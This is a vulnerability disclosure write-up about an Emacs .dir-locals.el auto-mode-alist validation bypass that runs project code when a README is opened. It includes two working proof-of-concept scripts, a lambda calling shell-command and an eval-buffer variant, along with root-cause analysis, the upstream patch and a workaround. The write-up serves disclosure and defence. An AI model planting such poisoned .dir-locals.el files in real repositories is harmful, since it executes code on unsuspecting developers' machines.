# Opening a README Was Enough: Code Execution Through Emacs Directory Locals

By X3r0Day · November 12, 2026 · CVE-2026-131959

I found a validation bypass in GNU Emacs, tracked as [CVE-2026-131959](https://www.cve.org/CVERecord?id=CVE-2026-131959), that let a project's `.dir-locals.el` run arbitrary Emacs Lisp when a matching file was opened. The file itself could be an ordinary Markdown README. No eval command, no local-variable approval, no trust prompt.

Which means the attack is: clone a repo, open the README, and someone else's code is now running with your permissions. In an editor that ships with most Linux distributions. Of all the things I expected to get out of a Markdown file, remote code execution was not near the top of the list.

The issue affected Emacs 31.1 and the pre-fix 32.0.50 builds I tested. Emacs 30.2 and older are unaffected. Upstream disclosed on November 11, credited the discovery to X3r0Day, and published Stefan Monnier's patch. Sean Whitton confirmed the fix was on the release branch, and the tracker marks the bug fixed in 31.2.

**Patch status:** the fix is available upstream. The [November 11 announcement](https://www.openwall.com/lists/oss-security/2026/11/11/7) described 31.2 as an upcoming release; a fixed release branch is not the same thing as an already-shipped release. The [public bug report, #82213](https://debbugs.gnu.org/82213), contains the original report, patch, and release-branch confirmation.

**Severity:** 7.8 (High) — `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`. **CVE:** [CVE-2026-131959](https://www.cve.org/CVERecord?id=CVE-2026-131959).

## The short version

The attack needed two files in an attacker-controlled project:

```text
project/
├── .dir-locals.el
└── README.md
```

The README didn't have to contain anything executable. The payload lived in `.dir-locals.el`, dressed up as an entry in the directory-local `auto-mode-alist`. It's a plain text file sitting in the repo, so it goes through review like every other config file. Which is to say nobody reads it.

That's the whole setup. Two files, one of which is a README.

Open the README and Emacs starts picking a major mode. Somewhere in that selection, an internal matching helper calls an attacker-supplied function. The check on whether the function was allowed happens later, in the caller, on a value the helper has already returned.

By then the function has run. Emacs goes on to select a completely harmless mode and everything looks normal.

**Opening a matching file was enough to run project-supplied code**, with the same permissions as Emacs.

## What directory locals are supposed to do

Emacs projects use `.dir-locals.el` to set editing behavior for a whole tree. Indentation, formatting, all the small opinions that make a codebase feel like home.

There's also a special `auto-mode-alist` entry that lets a directory pick major modes based on filename, which matters because selecting a mode means calling a function. Functions supplied this way get a dedicated gatekeeper:

```elisp
(defun set-auto-mode--dir-local-valid-p (mode)
  "Say whether MODE can be used in a .dir-local.el `auto-mode-alist'."
  (and (symbolp mode)
       (string-suffix-p "-mode" (symbol-name mode))
       (commandp mode)
       (not (provided-mode-derived-p mode 'special-mode))))
```

An arbitrary lambda fails that check. `eval-buffer` fails it too. The gate exists because both of those are terrible ideas.

This also wasn't a normal directory-local `eval` setting. `set-auto-mode` pulls the special `auto-mode-alist` key through `hack-dir-local--get-variables`, outside the ordinary risky-variable approval flow. Once that check was bypassed, no second prompt was coming to save anyone.

## The matcher that did more than match

Here's the path a file takes when you open it:

```text
find-file
  normal-mode
    set-auto-mode
      read the directory-local auto-mode-alist
      set-auto-mode--apply-alist
        set-auto-mode--find-matching-alist-entry
```

The caller asks the helper for a mode, then validates whatever comes back:

```elisp
(setq mode (set-auto-mode--find-matching-alist-entry
            alist name case-insensitive-p))
(when (and dir-local mode
           (not (set-auto-mode--dir-local-valid-p mode)))
  (message "Ignoring invalid mode `%S'" mode)
  (setq mode nil))
(when mode
  (set-auto-mode-0 mode keep-mode-if-same)
  t)
```

All very sensible, provided the helper only ever returns a value. But `auto-mode-alist` accepts more than the familiar `(REGEXP . MODE)` pair. It also accepts:

```elisp
(REGEXP FUNCTION NON-NIL)
```

That third form runs a function, chops the matched suffix off the filename, and keeps searching for another match. It's documented, it's useful, and it's been in Emacs long enough that nobody looks at it twice.

In the vulnerable implementation, the helper remembered the first function and ran it as soon as it found the next entry:

```elisp
(when newmode
  (when mode
    (set-auto-mode-0 mode t))
  (setq mode newmode))
```

That `set-auto-mode-0` sits inside the helper, before any directory-local validation has run. Control comes back to the caller with the untrusted function already executed, and checking the return value at that point is bookkeeping, not security.

## Why the payload needs two entries

Here's the directory-local configuration from the lambda variant:

```elisp
((auto-mode-alist . (("" . fundamental-mode)
                     ("\\.md\\'" (lambda ()
                                   (shell-command "id > pwned"))
                                 t))))
```

Two details make it work.

First, the remembered function only fires when the matcher finds another match. The empty regexp matches everything, which in Lisp is the polite way of saying "match whatever, I'm not picky". So after `.md` is stripped from `README.md`, it still catches the filename and produces `fundamental-mode` as the final answer.

Second, Emacs collects directory-local entries in reverse. The catch-all goes first in the file so that the `.md` entry is the first one the matcher sees.

For `README.md`, the sequence is:

1. The `.md` entry matches, and its lambda goes into the remembered slot.
2. The `.md` suffix is removed from the name being examined.
3. The catch-all matches what's left.
4. The remembered lambda runs, inside the helper, unvalidated.
5. `fundamental-mode` comes back to the caller.
6. The caller validates `fundamental-mode`. It passes, because it is a real mode and has done nothing wrong.

The function that got checked was not the function that ran. One of them was a legitimate major mode. The other had already opened a shell.

## PoC 1: an ordinary Markdown file

The marker is deliberately dull: `id > pwned`. No beacon, no DNS exfil, no little victory banner. It writes down who you are and stops, which is all the proof this needs.

```sh
workdir="$(mktemp -d)"
cd "$workdir" || exit 1

cat > .dir-locals.el <<'EOF'
((auto-mode-alist . (("" . fundamental-mode)
                     ("\\.md\\'" (lambda ()
                                   (shell-command "id > pwned"))
                                 t))))
EOF

cat > README.md <<'EOF'
# Project notes

This is an ordinary Markdown document. It contains no Lisp.
EOF

emacs -Q --batch --eval '(find-file "README.md")'
cat pwned
```

On the vulnerable builds, opening the README left `pwned` in the project directory with output like this:

```text
uid=1000(user) gid=1000(user) groups=1000(user),...
```

The interactive version is the same trick without the batch flag:

```sh
emacs -nw -Q README.md
```

Execution happens while the file is being opened, before the buffer is drawn, and nothing asks for confirmation. `-Q` doesn't help. It tells Emacs to ignore your config. The project brought its own.

That's the uncomfortable part. You can read every line of that README and find nothing, because the payload wasn't in the file. It was in the project's editor configuration, shipped alongside it in the same clone.

## PoC 2: turning the opened buffer into code

The function slot didn't need a lambda. It could just name `eval-buffer`:

```elisp
((auto-mode-alist . (("" . fundamental-mode)
                     ("\\.md\\'" eval-buffer t))))
```

In this variant, the README is the payload:

```sh
workdir="$(mktemp -d)"
cd "$workdir" || exit 1

cat > .dir-locals.el <<'EOF'
((auto-mode-alist . (("" . fundamental-mode)
                     ("\\.md\\'" eval-buffer t))))
EOF

cat > README.md <<'EOF'
(shell-command "id > pwned")
;;
;; # Project notes
;; The remaining lines are Lisp comments.
EOF

emacs -Q --batch --eval '(find-file "README.md")'
cat pwned
```

Same marker file, different route. Selecting a mode made Emacs evaluate the open buffer as Lisp. `eval-buffer` is the sort of function that check exists to reject, and the early call never went anywhere near it.

Both variants are in the [original report](https://debbugs.gnu.org/82213#5). One reproducer is a claim; two is a pattern.

## What was tested, and what the impact was

Before the fix, both variants reproduced on Linux in batch and interactive TTY sessions:

| Build | Recorded result |
| --- | --- |
| Emacs 31.1, Arch package `31.1-2` | Both variants reproduced |
| Emacs 32.0.50, development build from November 9, 2026 | Both variants reproduced |
| Emacs 30.2 | Unaffected, as confirmed by upstream |

The 32.0.50 row is the November 9 development snapshot I tested, not every build that reports that version string. GUI file opening goes through the same mode-selection path, though the recorded runs were batch and TTY.

For this to work, someone has to control a project directory containing `.dir-locals.el` and get you to open a matching file inside it. Directory-local settings apply to subdirectories too, so dropping the config at a repository root covers everything beneath it. A README at the top of the tree is enough.

Unlike the [Git FSMonitor workspace-poisoning issue](/blog/fsmonitor-lrce/), this didn't require shipping a preconfigured `.git` directory. A tracked `.dir-locals.el` arrives with an ordinary clone. Cloning alone doesn't set it off, which is the thin slice of good news here: you still have to open a file. For a README, opening it is the entire point of a README.

The marker demonstrated shell execution at your privilege level. It isn't privilege escalation by itself, and in the lambda variant the README didn't need a single line of code.

## How the regression happened

The [original report](https://debbugs.gnu.org/82213#5) follows the behavior through three commits:

- `ad5faa424a`, July 23, 2021: added directory-local `auto-mode-alist` support.
- `9ac6ff53b1`, July 24, 2021: tightened validation to reject arbitrary functions through that feature.
- `504bdce731`, February 16, 2025: fixed multi-mode matching behavior for bug #75961 by making the remembered function actually run.

The 2021 tests covered an arbitrary symbol, a lambda, and `dired-mode`. All three were rejected, correctly. The `(REGEXP FUNCTION t)` shape wasn't among them, because in 2021 it couldn't execute anything. The 2025 change made it execute.

Everyone did their job. The bug shipped anyway.

Nobody weakened the predicate. A new call appeared on a path that never reached it.

## What the patch changes

Stefan Monnier's [published patch](https://www.openwall.com/lists/oss-security/2026/11/11/7) replaces `set-auto-mode--find-matching-alist-entry` with `set-auto-mode--from-matching-alist-entry` and passes the directory-local context down into it, so the check travels with the call instead of waiting at the exit.

```elisp
(when newmode
  (if (and dir-local
           (not (set-auto-mode--dir-local-valid-p mode)))
      (message "Ignoring invalid mode `%S'" mode)
    (set-auto-mode-0 mode keep-mode-if-same)
    (setq was-set t))
  mode-t)
```

The ordering is the fix. In the directory-local path, the validity check now stands in front of the call that actually executes a function, intermediate multi-mode functions included. A harmless final mode can't carry an earlier call past the gate anymore.

## Fix and temporary workaround

Install a build with the fix. The tracker names 31.2 as the fixed version and the announcement says the patch is intended for that release. On a distribution, check whether the fix was backported instead of trusting a version string.

If you're stuck on a vulnerable build, the workaround from my report was:

```elisp
(setq enable-dir-local-variables nil)
```

It blocked both PoCs when I tested it. It also switches off legitimate per-project settings, so treat it as a seatbelt rather than a repair.

## Disclosure timeline

| Date | Event |
| --- | --- |
| November 10, 2026 | Report recorded as GNU Emacs bug #82213. |
| November 11, 2026 | Sean Whitton published the oss-security advisory, crediting X3r0Day and attaching Stefan Monnier's patch. |
| November 11, 2026 | Sean confirmed the release-branch fix; the tracker marked the issue fixed in 31.2. |
| November 12, 2026 | This writeup published. |

Thanks to Stefan Monnier for the fix and to Sean Whitton for the disclosure and the release-branch confirmation.

The interesting part isn't "project config can be dangerous." Emacs already had a rule against exactly this kind of directory-local function execution, and the rule still worked. A later change put a side effect inside a helper, the caller kept validating only the returned value, and the execution moved out from under the check. Validation belongs where the action happens, not where the value comes back.

## References

- [CVE-2026-131959: Emacs .dir-locals.el code execution](https://www.cve.org/CVERecord?id=CVE-2026-131959)
- [oss-security: Emacs .dir-locals.el arbitrary code execution, November 11, 2026](https://www.openwall.com/lists/oss-security/2026/11/11/7)
- [GNU Emacs bug #82213: original report, PoCs, patch, and discussion](https://debbugs.gnu.org/82213)
- [Release-branch fix confirmation, message #13](https://debbugs.gnu.org/82213#13)